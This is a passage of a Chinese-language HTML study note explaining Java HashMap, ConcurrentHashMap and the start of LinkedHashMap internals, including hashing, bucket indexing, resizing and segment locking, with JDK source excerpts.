punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>null <span class="token operator">!=</span> table<span class="token punctuation">[</span>bucketIndex<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">resize</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> table<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>        hash <span class="token operator">=</span> <span class="token punctuation">(</span>null <span class="token operator">!=</span> key<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">hash</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">;</span>        bucketIndex <span class="token operator">=</span> <span class="token function">indexFor</span><span class="token punctuation">(</span>hash<span class="token punctuation">,</span> table<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">createEntry</span><span class="token punctuation">(</span>hash<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> bucketIndex<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">createEntry</span><span class="token punctuation">(</span><span class="token keyword">int</span> hash<span class="token punctuation">,</span> K key<span class="token punctuation">,</span> V value<span class="token punctuation">,</span> <span class="token keyword">int</span> bucketIndex<span class="token punctuation">)</span> <span class="token punctuation">{</span>    Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> e <span class="token operator">=</span> table<span class="token punctuation">[</span>bucketIndex<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 头插法，链表头部指向新的键值对</span>    table<span class="token punctuation">[</span>bucketIndex<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Entry</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>hash<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>    size<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">Entry</span><span class="token punctuation">(</span><span class="token keyword">int</span> h<span class="token punctuation">,</span> K k<span class="token punctuation">,</span> V v<span class="token punctuation">,</span> Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>    value <span class="token operator">=</span> v<span class="token punctuation">;</span>    next <span class="token operator">=</span> n<span class="token punctuation">;</span>    key <span class="token operator">=</span> k<span class="token punctuation">;</span>    hash <span class="token operator">=</span> h<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="4-确定桶下标"><a href="#4-确定桶下标" class="headerlink" title="4. 确定桶下标"></a>4. 确定桶下标</h3><p>很多操作都需要先确定一个键值对所在的桶下标。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">int</span> hash <span class="token operator">=</span> <span class="token function">hash</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token function">indexFor</span><span class="token punctuation">(</span>hash<span class="token punctuation">,</span> table<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><strong>4.1 计算 hash 值</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token function">hash</span><span class="token punctuation">(</span>Object k<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> h <span class="token operator">=</span> hashSeed<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">!=</span> h <span class="token operator">&amp;&amp;</span> k <span class="token keyword">instanceof</span> <span class="token class-name">String</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> sun<span class="token punctuation">.</span>misc<span class="token punctuation">.</span>Hashing<span class="token punctuation">.</span><span class="token function">stringHash32</span><span class="token punctuation">(</span><span class="token punctuation">(</span>String<span class="token punctuation">)</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    h <span class="token operator">^=</span> k<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// This function ensures that hashCodes that differ only by</span>    <span class="token comment" spellcheck="true">// constant multiples at each bit position have a bounded</span>    <span class="token comment" spellcheck="true">// number of collisions (approximately 8 at default load factor).</span>    h <span class="token operator">^=</span> <span class="token punctuation">(</span>h <span class="token operator">>>></span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>h <span class="token operator">>>></span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> h <span class="token operator">^</span> <span class="token punctuation">(</span>h <span class="token operator">>>></span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>h <span class="token operator">>>></span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> Objects<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">^</span> Objects<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><strong>4.2 取模</strong></p><p>令 x = 1&lt;&lt;4，即 x 为 2 的 4 次方，它具有以下性质：</p><pre class=" language-java"><code class="language-java">x   <span class="token operator">:</span> <span class="token number">00010000</span>x<span class="token operator">-</span><span class="token number">1</span> <span class="token operator">:</span> <span class="token number">00001111</span></code></pre><p>令一个数 y 与 x-1 做与运算，可以去除 y 位级表示的第 4 位以上数：</p><pre class=" language-java"><code class="language-java">y       <span class="token operator">:</span> <span class="token number">10110010</span>x<span class="token operator">-</span><span class="token number">1</span>     <span class="token operator">:</span> <span class="token number">00001111</span>y<span class="token operator">&amp;</span><span class="token punctuation">(</span>x<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token number">00000010</span></code></pre><p>这个性质和 y 对 x 取模效果是一样的：</p><pre class=" language-java"><code class="language-java">y   <span class="token operator">:</span> <span class="token number">10110010</span>x   <span class="token operator">:</span> <span class="token number">00010000</span>y<span class="token operator">%</span>x <span class="token operator">:</span> <span class="token number">00000010</span></code></pre><p>我们知道，位运算的代价比求模运算小的多，因此在进行这种计算时用位运算的话能带来更高的性能。</p><p>确定桶下标的最后一步是将 key 的 hash 值对桶个数取模：hash%capacity，如果能保证 capacity 为 2 的 n 次方，那么就可以将这个操作转换为位运算。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">indexFor</span><span class="token punctuation">(</span><span class="token keyword">int</span> h<span class="token punctuation">,</span> <span class="token keyword">int</span> length<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> h <span class="token operator">&amp;</span> <span class="token punctuation">(</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="5-扩容-基本原理"><a href="#5-扩容-基本原理" class="headerlink" title="5. 扩容-基本原理"></a>5. 扩容-基本原理</h3><p>设 HashMap 的 table 长度为 M，需要存储的键值对数量为 N，如果哈希函数满足均匀性的要求，那么每条链表的长度大约为 N/M，因此平均查找次数的复杂度为 O(N/M)。</p><p>为了让查找的成本降低，应该尽可能使得 N/M 尽可能小，因此需要保证 M 尽可能大，也就是说 table 要尽可能大。HashMap 采用动态扩容来根据当前的 N 值来调整 M 值，使得空间效率和时间效率都能得到保证。</p><p>和扩容相关的参数主要有：capacity、size、threshold 和 load_factor。</p><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td>capacity</td><td>table 的容量大小，默认为 16。需要注意的是 capacity 必须保证为 2 的 n 次方。</td></tr><tr><td>size</td><td>键值对数量。</td></tr><tr><td>threshold</td><td>size 的临界值，当 size 大于等于 threshold 就必须进行扩容操作。</td></tr><tr><td>loadFactor</td><td>装载因子，table 能够使用的比例，threshold = capacity * loadFactor。</td></tr></tbody></table><pre class=" language-java"><code class="language-java"><span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> DEFAULT_INITIAL_CAPACITY <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> MAXIMUM_CAPACITY <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">30</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">float</span> DEFAULT_LOAD_FACTOR <span class="token operator">=</span> <span class="token number">0.75f</span><span class="token punctuation">;</span><span class="token keyword">transient</span> Entry<span class="token punctuation">[</span><span class="token punctuation">]</span> table<span class="token punctuation">;</span><span class="token keyword">transient</span> <span class="token keyword">int</span> size<span class="token punctuation">;</span><span class="token keyword">int</span> threshold<span class="token punctuation">;</span><span class="token keyword">final</span> <span class="token keyword">float</span> loadFactor<span class="token punctuation">;</span><span class="token keyword">transient</span> <span class="token keyword">int</span> modCount<span class="token punctuation">;</span></code></pre><p>从下面的添加元素代码中可以看出，当需要扩容时，令 capacity 为原来的两倍。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">void</span> <span class="token function">addEntry</span><span class="token punctuation">(</span><span class="token keyword">int</span> hash<span class="token punctuation">,</span> K key<span class="token punctuation">,</span> V value<span class="token punctuation">,</span> <span class="token keyword">int</span> bucketIndex<span class="token punctuation">)</span> <span class="token punctuation">{</span>    Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> e <span class="token operator">=</span> table<span class="token punctuation">[</span>bucketIndex<span class="token punctuation">]</span><span class="token punctuation">;</span>    table<span class="token punctuation">[</span>bucketIndex<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Entry</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>hash<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>size<span class="token operator">++</span> <span class="token operator">>=</span> threshold<span class="token punctuation">)</span>        <span class="token function">resize</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> table<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>扩容使用 resize() 实现，需要注意的是，扩容操作同样需要把 oldTable 的所有键值对重新插入 newTable 中，因此这一步是很费时的。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">void</span> <span class="token function">resize</span><span class="token punctuation">(</span><span class="token keyword">int</span> newCapacity<span class="token punctuation">)</span> <span class="token punctuation">{</span>    Entry<span class="token punctuation">[</span><span class="token punctuation">]</span> oldTable <span class="token operator">=</span> table<span class="token punctuation">;</span>    <span class="token keyword">int</span> oldCapacity <span class="token operator">=</span> oldTable<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>oldCapacity <span class="token operator">==</span> MAXIMUM_CAPACITY<span class="token punctuation">)</span> <span class="token punctuation">{</span>        threshold <span class="token operator">=</span> Integer<span class="token punctuation">.</span>MAX_VALUE<span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    Entry<span class="token punctuation">[</span><span class="token punctuation">]</span> newTable <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Entry</span><span class="token punctuation">[</span>newCapacity<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">transfer</span><span class="token punctuation">(</span>newTable<span class="token punctuation">)</span><span class="token punctuation">;</span>    table <span class="token operator">=</span> newTable<span class="token punctuation">;</span>    threshold <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>newCapacity <span class="token operator">*</span> loadFactor<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">transfer</span><span class="token punctuation">(</span>Entry<span class="token punctuation">[</span><span class="token punctuation">]</span> newTable<span class="token punctuation">)</span> <span class="token punctuation">{</span>    Entry<span class="token punctuation">[</span><span class="token punctuation">]</span> src <span class="token operator">=</span> table<span class="token punctuation">;</span>    <span class="token keyword">int</span> newCapacity <span class="token operator">=</span> newTable<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> src<span class="token punctuation">.</span>length<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> e <span class="token operator">=</span> src<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>e <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            src<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> null<span class="token punctuation">;</span>            <span class="token keyword">do</span> <span class="token punctuation">{</span>                Entry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> next <span class="token operator">=</span> e<span class="token punctuation">.</span>next<span class="token punctuation">;</span>                <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token function">indexFor</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>hash<span class="token punctuation">,</span> newCapacity<span class="token punctuation">)</span><span class="token punctuation">;</span>                e<span class="token punctuation">.</span>next <span class="token operator">=</span> newTable<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                newTable<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token punctuation">;</span>                e <span class="token operator">=</span> next<span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>e <span class="token operator">!=</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="6-扩容-重新计算桶下标"><a href="#6-扩容-重新计算桶下标" class="headerlink" title="6. 扩容-重新计算桶下标"></a>6. 扩容-重新计算桶下标</h3><p>在进行扩容时，需要把键值对重新放到对应的桶上。HashMap 使用了一个特殊的机制，可以降低重新计算桶下标的操作。</p><p>假设原数组长度 capacity 为 16，扩容之后 new capacity 为 32：</p><pre class=" language-java"><code class="language-java">capacity     <span class="token operator">:</span> <span class="token number">00010000</span><span class="token keyword">new</span> <span class="token class-name">capacity</span> <span class="token operator">:</span> <span class="token number">00100000</span></code></pre><p>对于一个 Key，</p><ul><li>它的哈希值如果在第 5 位上为 0，那么取模得到的结果和之前一样；</li><li>如果为 1，那么得到的结果为原来的结果 +16。</li></ul><h3 id="7-计算数组容量"><a href="#7-计算数组容量" class="headerlink" title="7. 计算数组容量"></a>7. 计算数组容量</h3><p>HashMap 构造函数允许用户传入的容量不是 2 的 n 次方，因为它可以自动地将传入的容量转换为 2 的 n 次方。</p><p>先考虑如何求一个数的掩码，对于 10010000，它的掩码为 11111111，可以使用以下方法得到：</p><pre class=" language-java"><code class="language-java">mask <span class="token operator">|=</span> mask <span class="token operator">>></span> <span class="token number">1</span>    <span class="token number">11011000</span>mask <span class="token operator">|=</span> mask <span class="token operator">>></span> <span class="token number">2</span>    <span class="token number">11111110</span>mask <span class="token operator">|=</span> mask <span class="token operator">>></span> <span class="token number">4</span>    <span class="token number">11111111</span></code></pre><p>mask+1 是大于原始数字的最小的 2 的 n 次方。</p><pre class=" language-java"><code class="language-java">num     <span class="token number">10010000</span>mask<span class="token operator">+</span><span class="token number">1</span> <span class="token number">100000000</span></code></pre><p>以下是 HashMap 中计算数组容量的代码：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token function">tableSizeFor</span><span class="token punctuation">(</span><span class="token keyword">int</span> cap<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> n <span class="token operator">=</span> cap <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    n <span class="token operator">|=</span> n <span class="token operator">>>></span> <span class="token number">1</span><span class="token punctuation">;</span>    n <span class="token operator">|=</span> n <span class="token operator">>>></span> <span class="token number">2</span><span class="token punctuation">;</span>    n <span class="token operator">|=</span> n <span class="token operator">>>></span> <span class="token number">4</span><span class="token punctuation">;</span>    n <span class="token operator">|=</span> n <span class="token operator">>>></span> <span class="token number">8</span><span class="token punctuation">;</span>    n <span class="token operator">|=</span> n <span class="token operator">>>></span> <span class="token number">16</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token punctuation">(</span>n <span class="token operator">>=</span> MAXIMUM_CAPACITY<span class="token punctuation">)</span> <span class="token operator">?</span> MAXIMUM_CAPACITY <span class="token operator">:</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="8-链表转红黑树"><a href="#8-链表转红黑树" class="headerlink" title="8. 链表转红黑树"></a>8. 链表转红黑树</h3><p>从 JDK 1.8 开始，一个桶存储的链表长度大于 8 时会将链表转换为红黑树。</p><h3 id="9-与-HashTable-的比较"><a href="#9-与-HashTable-的比较" class="headerlink" title="9. 与 HashTable 的比较"></a>9. 与 HashTable 的比较</h3><ul><li>HashTable 使用 synchronized 来进行同步。</li><li>HashMap 可以插入键为 null 的 Entry。</li><li>HashMap 的迭代器是 fail-fast 迭代器。</li><li>HashMap 不能保证随着时间的推移 Map 中的元素次序是不变的。</li></ul><h2 id="ConcurrentHashMap"><a href="#ConcurrentHashMap" class="headerlink" title="ConcurrentHashMap"></a>ConcurrentHashMap</h2><h3 id="1-存储结构-1"><a href="#1-存储结构-1" class="headerlink" title="1. 存储结构"></a>1. 存储结构</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name">HashEntry</span><span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">final</span> <span class="token keyword">int</span> hash<span class="token punctuation">;</span>    <span class="token keyword">final</span> K key<span class="token punctuation">;</span>    <span class="token keyword">volatile</span> V value<span class="token punctuation">;</span>    <span class="token keyword">volatile</span> HashEntry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> next<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>ConcurrentHashMap 和 HashMap 实现上类似，最主要的差别是 ConcurrentHashMap 采用了分段锁（Segment），每个分段锁维护着几个桶（HashEntry），多个线程可以同时访问不同分段锁上的桶，从而使其并发度更高（并发度就是 Segment 的个数）。</p><p>Segment 继承自 ReentrantLock。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name">Segment</span><span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> <span class="token keyword">extends</span> <span class="token class-name">ReentrantLock</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> 2249069246763182397L<span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> MAX_SCAN_RETRIES <span class="token operator">=</span>        Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">availableProcessors</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span> <span class="token operator">?</span> <span class="token number">64</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">transient</span> <span class="token keyword">volatile</span> HashEntry<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span><span class="token punctuation">[</span><span class="token punctuation">]</span> table<span class="token punctuation">;</span>    <span class="token keyword">transient</span> <span class="token keyword">int</span> count<span class="token punctuation">;</span>    <span class="token keyword">transient</span> <span class="token keyword">int</span> modCount<span class="token punctuation">;</span>    <span class="token keyword">transient</span> <span class="token keyword">int</span> threshold<span class="token punctuation">;</span>    <span class="token keyword">final</span> <span class="token keyword">float</span> loadFactor<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">final</span> Segment<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span><span class="token punctuation">[</span><span class="token punctuation">]</span> segments<span class="token punctuation">;</span></code></pre><p>默认的并发级别为 16，也就是说默认创建 16 个 Segment。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> DEFAULT_CONCURRENCY_LEVEL <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">;</span></code></pre><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/3fdfc89d-719e-4d93-b518-29fa612b3b18.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/3fdfc89d-719e-4d93-b518-29fa612b3b18.png" alt="img"></a></p><h3 id="2-size-操作"><a href="#2-size-操作" class="headerlink" title="2. size 操作"></a>2. size 操作</h3><p>每个 Segment 维护了一个 count 变量来统计该 Segment 中的键值对个数。</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * The number of elements. Accessed only either within locks * or among other volatile reads that maintain visibility. */</span><span class="token keyword">transient</span> <span class="token keyword">int</span> count<span class="token punctuation">;</span></code></pre><p>在执行 size 操作时，需要遍历所有 Segment 然后把 count 累计起来。</p><p>ConcurrentHashMap 在执行 size 操作时先尝试不加锁，如果连续两次不加锁操作得到的结果一致，那么可以认为这个结果是正确的。</p><p>尝试次数使用 RETRIES_BEFORE_LOCK 定义，该值为 2，retries 初始值为 -1，因此尝试次数为 3。</p><p>如果尝试的次数超过 3 次，就需要对每个 Segment 加锁。</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * Number of unsynchronized retries in size and containsValue * methods before resorting to locking. This is used to avoid * unbounded retries if tables undergo continuous modification * which would make it impossible to obtain an accurate result. */</span><span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> RETRIES_BEFORE_LOCK <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Try a few times to get accurate count. On failure due to</span>    <span class="token comment" spellcheck="true">// continuous async changes in table, resort to locking.</span>    <span class="token keyword">final</span> Segment<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span><span class="token punctuation">[</span><span class="token punctuation">]</span> segments <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>segments<span class="token punctuation">;</span>    <span class="token keyword">int</span> size<span class="token punctuation">;</span>    <span class="token keyword">boolean</span> overflow<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true if size overflows 32 bits</span>    <span class="token keyword">long</span> sum<span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">// sum of modCounts</span>    <span class="token keyword">long</span> last <span class="token operator">=</span> 0L<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// previous sum</span>    <span class="token keyword">int</span> retries <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// first iteration isn't retry</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 超过尝试次数，则对每个 Segment 加锁</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>retries<span class="token operator">++</span> <span class="token operator">==</span> RETRIES_BEFORE_LOCK<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> segments<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span>                    <span class="token function">ensureSegment</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// force creation</span>            <span class="token punctuation">}</span>            sum <span class="token operator">=</span> 0L<span class="token punctuation">;</span>            size <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            overflow <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> segments<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>                Segment<span class="token operator">&lt;</span>K<span class="token punctuation">,</span>V<span class="token operator">></span> seg <span class="token operator">=</span> <span class="token function">segmentAt</span><span class="token punctuation">(</span>segments<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>seg <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    sum <span class="token operator">+=</span> seg<span class="token punctuation">.</span>modCount<span class="token punctuation">;</span>                    <span class="token keyword">int</span> c <span class="token operator">=</span> seg<span class="token punctuation">.</span>count<span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token punctuation">(</span>size <span class="token operator">+=</span> c<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>                        overflow <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// 连续两次得到的结果一致，则认为这个结果是正确的</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>sum <span class="token operator">==</span> last<span class="token punctuation">)</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            last <span class="token operator">=</span> sum<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>retries <span class="token operator">></span> RETRIES_BEFORE_LOCK<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> segments<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span>                <span class="token function">segmentAt</span><span class="token punctuation">(</span>segments<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> overflow <span class="token operator">?</span> Integer<span class="token punctuation">.</span>MAX_VALUE <span class="token operator">:</span> size<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="3-JDK-1-8-的改动"><a href="#3-JDK-1-8-的改动" class="headerlink" title="3. JDK 1.8 的改动"></a>3. JDK 1.8 的改动</h3><p>JDK 1.7 使用分段锁机制来实现并发更新操作，核心类为 Segment，它继承自重入锁 ReentrantLock，并发度与 Segment 数量相等。</p><p>JDK 1.8 使用了 CAS 操作来支持更高的并发度，在 CAS 操作失败时使用内置锁 synchronized。</p><p>并且 JDK 1.8 的实现也在链表过长时会转换为红黑树。</p><h2 id="LinkedHashMap"><a href="#LinkedHashMap" class="headerlink" title="LinkedHashMap"></a>LinkedHashMap</h2><h3 id="存储结构"><a href="#存储结构" class="headerlink" title="存储结构"></a>存储结构</h3><p>继承自 HashMap，因此具有和 HashMap 一样的快速查找特性。</p><pre class=" language-java"><code 